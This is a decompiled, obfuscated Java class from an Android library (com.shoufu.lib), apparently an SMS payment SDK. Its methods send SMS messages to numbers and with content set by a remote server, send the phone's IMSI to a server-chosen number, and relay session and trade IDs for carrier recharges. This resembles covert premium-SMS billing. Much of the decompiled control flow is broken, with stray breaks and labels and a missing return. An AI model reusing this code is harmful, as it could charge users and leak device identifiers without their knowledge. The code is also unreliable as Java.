package com.shoufu.lib;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import com.shoufu.a;
import com.shoufu.entity.response.Task;
import com.shoufu.entity.response.TaskData;
import com.shoufu.entity.response.TaskResultMap;
import com.shoufu.entity.response.ZydQlRechargeData;
import com.shoufu.entity.response.ZydQlSmsData;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

public class cx
{
  protected static Handler a = new cy();
  protected static int b = -1;
  protected static Handler c;
  private static Context d;
  private static String e;
  private static String f;
  private static boolean g = false;
  private static Task h;
  private static Context i = null;
  private static String j = null;
  private static Task k = null;
  private static Handler l = null;
  private static int m = -1;
  private static at n = new at();
  private static ay o = new ay();
  private static aw p = new df();
  
  public static int a(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    TaskResultMap localTaskResultMap;
    int i2;
    if ("0".equals(paramTaskData.getCode()))
    {
      Log.d("TaskUtil", "sms");
      localTaskResultMap = paramTaskData.getResultmap();
      if (localTaskResultMap.getSuccess() == 1)
      {
        if (paramHandler != null) {
          paramHandler.obtainMessage(8).sendToTarget();
        }
        return 0;
      }
      paramTaskData = paramTaskData.getResultlist().iterator();
      int i1 = 0;
      for (;;)
      {
        if (!paramTaskData.hasNext()) {
          return i1;
        }
        paramHandler = (Task)paramTaskData.next();
        i2 = 0;
        label86:
        if (i2 < paramHandler.getCount()) {
          break;
        }
        i1 += 1;
      }
      if (i2 != 0) {}
    }
    for (;;)
    {
      try
      {
        ci.a(paramContext, localTaskResultMap.getTradeid(), paramHandler, null);
        String str = localTaskResultMap.getTradeid();
        int i4 = paramHandler.getTid();
        int i5 = paramHandler.getSmsid();
        if (paramHandler.getType() != 0) {
          break label305;
        }
        i3 = 1;
        dv.a(paramContext, str, i4, i5, i3, URLDecoder.decode(paramHandler.getNum(), "utf-8"), URLDecoder.decode(paramHandler.getContent(), "utf-8"));
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
      }
      dv.a(paramContext, 0, URLDecoder.decode(paramHandler.getNum(), "utf-8"), URLDecoder.decode(paramHandler.getContent(), "utf-8"), null, null);
      break label296;
      if (!"110".equals(paramTaskData.getCode())) {
        break;
      }
      Log.d("TaskUtil", "reg");
      paramTaskData = paramTaskData.getResultmap().getRegnum().split("\\|");
      if ((paramTaskData == null) || (paramTaskData.length <= 0)) {
        break;
      }
      dv.a(paramContext, 0, paramTaskData[aa.a(0, paramTaskData.length)], "imsi://" + ai.b(paramContext), null, null);
      return 0;
      label296:
      i2 += 1;
      break label86;
      label305:
      int i3 = 0;
    }
  }
  
  public static String a(String paramString1, String paramString2)
  {
    if ((TextUtils.isEmpty(paramString1)) || (TextUtils.isEmpty(paramString2))) {}
    String str;
    do
    {
      return null;
      str = "?" + paramString2 + "=";
      paramString2 = "&" + paramString2 + "=";
      i1 = Math.max(paramString1.indexOf(str), paramString1.indexOf(paramString2));
    } while (i1 == -1);
    paramString1 = paramString1.substring(str.length() + i1);
    int i1 = paramString1.indexOf("&");
    if (i1 != -1) {
      return paramString1.substring(0, i1).trim();
    }
    return paramString1.trim();
  }
  
  public static void a(Activity paramActivity, String paramString, TaskData paramTaskData, Handler paramHandler)
  {
    new dd(paramTaskData, paramHandler, paramActivity, paramString).start();
  }
  
  public static void a(Context paramContext, TaskData paramTaskData, Handler paramHandler, boolean paramBoolean)
  {
    new dk(paramTaskData, paramHandler, paramContext, paramBoolean).start();
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    new dm(paramString1, paramContext, paramString2, paramString3).start();
  }
  
  public static void a(a paramA, String paramString1, String paramString2, String paramString3)
  {
    Log.d("TaskUtil", "pc2");
    new de(paramString1, paramString2, paramString3, paramA).start();
  }
  
  public static boolean a(ZydQlSmsData paramZydQlSmsData, String[] paramArrayOfString, String paramString)
  {
    boolean bool2 = false;
    Object localObject = new ArrayList();
    ((List)localObject).add(new BasicNameValuePair("myorderid", paramZydQlSmsData.getMyorderid()));
    ((List)localObject).add(new BasicNameValuePair("randnum", paramString));
    paramString = ab.a(paramArrayOfString[2], (List)localObject);
    boolean bool1 = bool2;
    if (!TextUtils.isEmpty(paramString))
    {
      paramString = new JSONObject(paramString);
      localObject = new ZydQlRechargeData();
      z.a(localObject, paramString);
      bool1 = bool2;
      if (((ZydQlRechargeData)localObject).getStatus() == 0)
      {
        String str = c(paramArrayOfString[3], ((ZydQlRechargeData)localObject).getReq());
        bool1 = bool2;
        if (!TextUtils.isEmpty(str))
        {
          bool1 = bool2;
          if (str.indexOf("<SessionID>") != -1)
          {
            bool1 = bool2;
            if (str.indexOf("<CheckID>") != -1)
            {
              bool1 = bool2;
              if (str.indexOf("<TradeID>") != -1)
              {
                paramString = str.substring(str.indexOf("<SessionID>") + "<SessionID>".length(), str.lastIndexOf("</SessionID>"));
                localObject = str.substring(str.indexOf("<CheckID>") + "<CheckID>".length(), str.lastIndexOf("</CheckID>"));
                str = str.substring(str.indexOf("<TradeID>") + "<TradeID>".length(), str.lastIndexOf("</TradeID>"));
                ArrayList localArrayList = new ArrayList();
                localArrayList.add(new BasicNameValuePair("myorderid", paramZydQlSmsData.getMyorderid()));
                localArrayList.add(new BasicNameValuePair("sessionid", paramString));
                localArrayList.add(new BasicNameValuePair("checkid", (String)localObject));
                localArrayList.add(new BasicNameValuePair("tradeid", str));
                paramZydQlSmsData = ab.a(paramArrayOfString[4], localArrayList);
                bool1 = bool2;
                if (!TextUtils.isEmpty(paramZydQlSmsData))
                {
                  paramZydQlSmsData = new JSONObject(paramZydQlSmsData);
                  paramString = new ZydQlRechargeData();
                  z.a(paramString, paramZydQlSmsData);
                  bool1 = bool2;
                  if (paramString.getStatus() == 0)
                  {
                    bool1 = bool2;
                    if (c(paramArrayOfString[5], paramString.getReq()) != null) {
                      bool1 = true;
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    return bool1;
  }
  
  public static void b(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new dg(paramTaskData, paramHandler, paramContext).start();
  }
  
  private static String c(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new String(Base64.decode(paramString2, 0));
      paramString1 = (HttpURLConnection)new URL(paramString1).openConnection();
      paramString1.setDoOutput(true);
      paramString1.setDoInput(true);
      paramString1.setUseCaches(false);
      paramString1.setInstanceFollowRedirects(true);
      paramString1.setRequestMethod("POST");
      paramString1.setRequestProperty("Accept", "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2");
      paramString1.setRequestProperty("Content-Type", "text/plain; charset=ISO-8859-1");
      paramString1.connect();
      Object localObject = new OutputStreamWriter(paramString1.getOutputStream(), "UTF-8");
      ((OutputStreamWriter)localObject).append(paramString2);
      ((OutputStreamWriter)localObject).flush();
      ((OutputStreamWriter)localObject).close();
      int i1 = paramString1.getContentLength();
      paramString1 = paramString1.getInputStream();
      if (i1 != -1)
      {
        paramString2 = new byte[i1];
        localObject = new byte['È€'];
        i1 = 0;
        for (;;)
        {
          int i2 = paramString1.read((byte[])localObject);
          if (i2 <= 0) {
            return new String(paramString2, "UTF-8");
          }
          System.arraycopy(localObject, 0, paramString2, i1, i2);
          i1 += i2;
        }
      }
      return null;
    }
    catch (IOException paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static void c(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new dh(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void d(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new di(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void e(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new dj(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void f(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new dl(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void g(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new cz(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void h(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new da(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void i(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new db(paramTaskData, paramHandler, paramContext).start();
  }
  
  public static void j(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    int i1 = -1;
    int i2 = i1;
    try
    {
      Log.d("TaskUtil", "zzlySdk");
      i2 = i1;
      Object localObject1 = paramTaskData.getResultmap();
      i2 = i1;
      if (((TaskResultMap)localObject1).getSuccess() == 1)
      {
        if (paramHandler == null) {
          return;
        }
        i2 = i1;
        paramHandler.obtainMessage(8).sendToTarget();
        return;
      }
      i2 = i1;
      i = paramContext;
      i2 = i1;
      l = paramHandler;
      i2 = i1;
      i1 = ((TaskResultMap)localObject1).getNextrequestcode();
      i2 = i1;
      m = i1;
      i2 = i1;
      j = ((TaskResultMap)localObject1).getTradeid();
      i2 = i1;
      Object localObject2 = (Task)paramTaskData.getResultlist().get(0);
      i2 = i1;
      k = (Task)localObject2;
      i2 = i1;
      paramTaskData = URLDecoder.decode(((Task)localObject2).getNum(), "utf-8").trim();
      i2 = i1;
      localObject1 = URLDecoder.decode(((Task)localObject2).getContent(), "utf-8").trim();
      i2 = i1;
      localObject2 = ((Task)localObject2).getCppram().trim();
      i2 = i1;
      n.a(paramContext, p, (String)localObject2, (String)localObject1);
      i2 = i1;
      o.a(paramContext, p, (String)localObject2, (String)localObject1);
      i2 = i1;
      o.a();
      i2 = i1;
      int i3 = n.a(paramTaskData);
      i2 = i1;
      if (i3 != 0) {
        break label266;
      }
      i3 = 1;
      i2 = i1;
      i1 = i3;
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
        label266:
        i1 = 0;
      }
    }
    if ((i1 == 0) && (paramHandler != null))
    {
      paramHandler.obtainMessage(7, i2, 0).sendToTarget();
      return;
    }
  }
  
  public static void k(Context paramContext, TaskData paramTaskData, Handler paramHandler)
  {
    new dc(paramTaskData, paramHandler, paramContext).start();
  }
}
